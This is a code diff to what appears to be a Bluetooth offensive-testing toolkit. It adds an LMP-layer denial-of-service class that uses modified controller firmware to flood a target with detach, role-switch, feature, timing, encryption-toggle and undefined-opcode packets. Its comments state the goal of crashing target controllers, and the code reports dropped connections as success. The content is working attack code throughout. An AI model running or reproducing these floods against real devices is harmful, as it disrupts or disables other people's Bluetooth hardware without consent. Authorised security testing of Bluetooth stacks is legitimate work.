@@ -290,6 +290,8 @@ class L2CAPDoS:
             count: Number of requests to send.
             payload_size: Payload size per request.
         """
+        if payload_size < 5:
+            payload_size = 5
         info(f"L2CAP data flood against {self.target} "
              f"({count} packets, {payload_size}B each)")
         start_time = time.time()
@@ -1268,3 +1270,252 @@ class HFPDoS:
         return _make_result(self.target, "slc_state_confusion", packets_sent,
                             start_time, "success",
                             f"{len(confusion_commands)} out-of-order AT commands")
+
+
+# ===========================================================================
+# LMP DoS (via DarkFirmware)
+# ===========================================================================
+
+class LMPDoS:
+    """LMP-layer Denial of Service attacks via DarkFirmware.
+
+    Operates below L2CAP at the Link Manager Protocol level. These attacks
+    target the Bluetooth controller's firmware rather than the host stack,
+    making them harder to filter and potentially causing hard crashes
+    requiring power cycling.
+
+    Usage:
+        dos = LMPDoS("AA:BB:CC:DD:EE:FF")
+        result = dos.detach_flood(count=1000)
+    """
+
+    def __init__(self, target: str, hci: str = "hci0"):
+        self.target = target
+        self.hci = hci
+
+    def _get_hci_idx(self) -> int:
+        """Extract numeric HCI device index."""
+        return int(self.hci.replace("hci", "")) if self.hci.startswith("hci") else 1
+
+    def _run_lmp_flood(
+        self,
+        method_name: str,
+        packet_builder,
+        count: int,
+        delay: float,
+    ) -> dict[str, Any]:
+        """Common LMP flood loop.
+
+        Opens HCIVSCSocket, sends packets via the builder callable, logs
+        progress, and catches connection drops as potential crashes.
+
+        Args:
+            method_name: Human-readable attack method name for logging.
+            packet_builder: Callable(iteration_index) -> bytes returning
+                            the LMP packet to send.
+            count: Number of packets to send.
+            delay: Delay between packets in seconds.
+
+        Returns:
+            Standard result dict.
+        """
+        from blue_tap.core.hci_vsc import HCIVSCSocket
+        from blue_tap.core.firmware import DarkFirmwareManager
+
+        hci_idx = self._get_hci_idx()
+        result: dict[str, Any] = {
+            "method": method_name,
+            "packets_sent": 0,
+            "errors": 0,
+            "duration": 0.0,
+            "target_status": "unknown",
+        }
+
+        info(f"[LMP DoS] Starting {method_name} against {self.target}")
+        info(f"[LMP DoS] Step 1: Opening DarkFirmware socket on hci{hci_idx}")
+
+        # Verify DarkFirmware
+        try:
+            fw = DarkFirmwareManager()
+            if not fw.is_darkfirmware_loaded(self.hci):
+                error(f"[LMP DoS] DarkFirmware not loaded on {self.hci}")
+                result["target_status"] = "error"
+                return result
+        except Exception as exc:
+            error(f"[LMP DoS] Failed to check DarkFirmware: {exc}")
+            result["target_status"] = "error"
+            return result
+
+        info(f"[LMP DoS] Step 2: Verifying ACL connection...")
+        # Ensure connection exists
+        run_cmd(["bluetoothctl", "connect", self.target], timeout=15)
+        time.sleep(1)
+
+        info(f"[LMP DoS] Starting {method_name} ({count} packets, {delay}s interval)")
+        start_time = time.time()
+
+        try:
+            with HCIVSCSocket(hci_idx) as vsc:
+                for i in range(count):
+                    try:
+                        pkt = packet_builder(i)
+                        ok = vsc.send_lmp(pkt)
+                        if ok:
+                            result["packets_sent"] += 1
+                        else:
+                            result["errors"] += 1
+                    except (OSError, TimeoutError) as exc:
+                        result["errors"] += 1
+                        if result["errors"] > 10:
+                            warning(f"[LMP DoS] No response within timeout — "
+                                    f"target may have crashed after {result['packets_sent']} packets")
+                            result["target_status"] = "possibly_crashed"
+                            break
+
+                    if (i + 1) % 100 == 0:
+                        elapsed = time.time() - start_time
+                        rate = result["packets_sent"] / max(elapsed, 0.01)
+                        info(f"[LMP DoS] [{i + 1}/{count}] packets sent "
+                             f"({rate:.0f} pkt/s, {result['errors']} errors)")
+
+                    if delay > 0:
+                        time.sleep(delay)
+
+        except Exception as exc:
+            warning(f"[LMP DoS] Connection lost: {exc}")
+            result["target_status"] = "possibly_crashed"
+
+        result["duration"] = round(time.time() - start_time, 2)
+
+        if result["target_status"] == "possibly_crashed":
+            success(f"[LMP DoS] Attack complete: target may have crashed "
+                    f"({result['packets_sent']} packets in {result['duration']}s)")
+        elif result["errors"] == 0:
+            warning(f"[LMP DoS] Attack complete: target survived "
+                    f"({result['packets_sent']} packets in {result['duration']}s)")
+            result["target_status"] = "survived"
+        else:
+            info(f"[LMP DoS] Attack complete: {result['packets_sent']} sent, "
+                 f"{result['errors']} errors in {result['duration']}s")
+            result["target_status"] = "partial"
+
+        return result
+
+    def detach_flood(self, count: int = 1000, delay: float = 0.001) -> dict[str, Any]:
+        """Rapid LMP_DETACH with varying error codes.
+
+        Sends LMP_DETACH PDUs with rotating error codes to force repeated
+        link teardown. Targets that don't properly rate-limit detach
+        handling may crash or require power cycling.
+
+        Args:
+            count: Number of detach packets to send.
+            delay: Delay between packets in seconds.
+        """
+        from blue_tap.fuzz.protocols.lmp import build_detach
+
+        # Rotate through various error codes
+        error_codes = [0x05, 0x13, 0x14, 0x15, 0x16, 0x29, 0x2A, 0x3B]
+
+        def builder(i: int) -> bytes:
+            return build_detach(error_code=error_codes[i % len(error_codes)])
+
+        return self._run_lmp_flood("detach_flood", builder, count, delay)
+
+    def switch_storm(self, count: int = 500, delay: float = 0.005) -> dict[str, Any]:
+        """Rapid LMP_SWITCH_REQ with varying switch_instant values.
+
+        Floods role-switch requests with different timing values, forcing
+        the target's link manager to process rapid role changes.
+
+        Args:
+            count: Number of switch request packets.
+            delay: Delay between packets in seconds.
+        """
+        from blue_tap.fuzz.protocols.lmp import build_switch_req
+
+        def builder(i: int) -> bytes:
+            return build_switch_req(switch_instant=i * 0x100)
+
+        return self._run_lmp_flood("switch_storm", builder, count, delay)
+
+    def features_flood(self, count: int = 1000, delay: float = 0.001) -> dict[str, Any]:
+        """Rapid LMP_FEATURES_REQ to exhaust per-request state.
+
+        Each features request forces the target to allocate state for the
+        response. Rapid flooding may exhaust the controller's request pool.
+
+        Args:
+            count: Number of features request packets.
+            delay: Delay between packets in seconds.
+        """
+        from blue_tap.fuzz.protocols.lmp import build_features_req
+
+        def builder(i: int) -> bytes:
+            return build_features_req()
+
+        return self._run_lmp_flood("features_flood", builder, count, delay)
+
+    def invalid_opcode_flood(self, count: int = 500, delay: float = 0.002) -> dict[str, Any]:
+        """Send undefined LMP opcodes (68-126 range).
+
+        Targets that don't properly handle unknown opcodes may crash or
+        enter undefined states when receiving opcodes outside the defined
+        range.
+
+        Args:
+            count: Number of invalid opcode packets.
+            delay: Delay between packets in seconds.
+        """
+        from blue_tap.fuzz.protocols.lmp import build_lmp
+
+        def builder(i: int) -> bytes:
+            # Opcodes 68-126 are undefined in the BT spec
+            opcode = 68 + (i % 59)
+            info_msg = f"[LMP DoS] Step 3: Sending undefined opcode ({opcode:#04x})..."
+            if i == 0:
+                info(info_msg)
+            return build_lmp(opcode, b"\x00" * 4)
+
+        return self._run_lmp_flood("invalid_opcode_flood", builder, count, delay)
+
+    def encryption_toggle(self, count: int = 100, delay: float = 0.01) -> dict[str, Any]:
+        """Alternating START/STOP encryption requests.
+
+        Rapidly toggles encryption state, forcing the target to repeatedly
+        set up and tear down encryption, which stresses the key scheduling
+        and cipher state machinery.
+
+        Args:
+            count: Number of toggle cycles (2 packets per cycle).
+            delay: Delay between packets in seconds.
+        """
+        from blue_tap.fuzz.protocols.lmp import (
+            build_start_encryption_req, build_stop_encryption_req,
+        )
+
+        def builder(i: int) -> bytes:
+            if i % 2 == 0:
+                return build_start_encryption_req()
+            else:
+                return build_stop_encryption_req()
+
+        return self._run_lmp_flood("encryption_toggle", builder, count * 2, delay)
+
+    def timing_flood(self, count: int = 1000, delay: float = 0.001) -> dict[str, Any]:
+        """Rapid LMP_TIMING_ACCURACY_REQ.
+
+        Floods timing accuracy requests to exhaust the target's timing
+        response handling. Each request triggers a mandatory response
+        computation.
+
+        Args:
+            count: Number of timing request packets.
+            delay: Delay between packets in seconds.
+        """
+        from blue_tap.fuzz.protocols.lmp import build_timing_accuracy_req
+
+        def builder(i: int) -> bytes:
+            return build_timing_accuracy_req()
+
+        return self._run_lmp_flood("timing_flood", builder, count, delay)
